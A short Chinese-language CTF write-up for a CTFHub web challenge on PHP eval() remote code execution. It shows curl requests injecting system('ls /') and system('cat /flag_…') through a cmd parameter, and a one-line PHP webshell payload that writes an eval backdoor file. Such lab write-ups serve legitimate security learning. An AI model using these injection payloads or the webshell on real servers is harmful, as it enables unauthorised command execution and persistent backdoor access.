---
title: CTFHub WriteUp
date: 2026-07-28
tags: []
---

# CTFHub WriteUp(web)



### RCE

---

#### 1、eval执行

打开靶场，eval()函数将传入的cmd参数当作php代码执行

![image-20260723120055420](../assets/CTFHub%20WriteUp/image-20260723120055420.png)

这里直接提示可通过参数cmd传入php代码，打开cmd

```
curl "http://challenge-0a8ae9745c8d5abd.sandbox.ctfhub.com:10800/?cmd=system('ls+/');"
```

![image-20260723120257551](../assets/CTFHub%20WriteUp/image-20260723120257551.png)

url中+代替空格，`ls /`查看根目录，发现目录flag_30687，cat查看

```
curl "http://challenge-0a8ae9745c8d5abd.sandbox.ctfhub.com:10800/?cmd=system('cat+/flag_30687');"
```

![image-20260723120743960](../assets/CTFHub%20WriteUp/image-20260723120743960.png)

找到flag

也可以传入一句话木马，用webshell连接

```
cmd= fputs(fopen('1.php','w'),'<?php @eval(_POST\[123\]);?\>');
```



---